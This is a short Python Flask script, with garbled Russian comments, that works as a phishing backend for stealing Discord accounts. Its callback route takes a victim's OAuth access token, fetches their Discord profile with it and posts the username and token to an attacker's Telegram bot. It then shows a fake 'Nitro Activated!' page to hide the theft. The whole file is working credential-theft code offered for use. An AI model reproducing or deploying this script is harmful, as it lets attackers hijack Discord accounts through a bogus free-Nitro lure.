# –£—Å—Ç–∞–Ω–æ–≤–∏: pip install flask requests
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/callback')
def callback():
    token = request.args.get('access_token')
    if token:
        # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        user = requests.get('https://discord.com/api/v9/users/@me',
                          headers={'Authorization': f'Bearer {token}'}).json()
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
        telegram_url = f"https://api.telegram.org/bot–¢–í–û–ô_–¢–û–ö–ï–ù/sendMessage"
        message = f"üéØ New Discord account!\nUser: {user['username']}\nToken: {token}"
        requests.post(telegram_url, json={'chat_id': '–¢–í–û–ô_ID', 'text': message})
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º "—É—Å–ø–µ—Ö"
        return '''
        <h1>‚úÖ Nitro Activated!</h1>
        <p>Check your Discord for Nitro benefits!</p>
        <p>It may take 5-10 minutes to appear.</p>
        '''
    
    return "Error"
